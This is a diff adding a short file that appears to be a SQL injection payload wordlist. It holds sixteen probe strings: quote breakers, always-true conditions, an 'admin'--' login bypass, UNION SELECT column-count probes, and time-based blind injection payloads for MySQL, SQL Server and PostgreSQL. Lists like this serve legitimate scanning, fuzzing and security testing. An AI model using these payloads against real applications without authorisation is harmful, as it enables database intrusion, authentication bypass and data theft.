@@ -1,0 +1,16 @@
+'
+"
+' OR '1'='1
+" OR "1"="1
+') OR ('1'='1
+1' OR '1'='1'--
+1" OR "1"="1"--
+admin'--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' AND SLEEP(5)--
+" AND SLEEP(5)--
+1 AND SLEEP(5)
+';WAITFOR DELAY '0:0:5'--
+1; SELECT pg_sleep(5)--
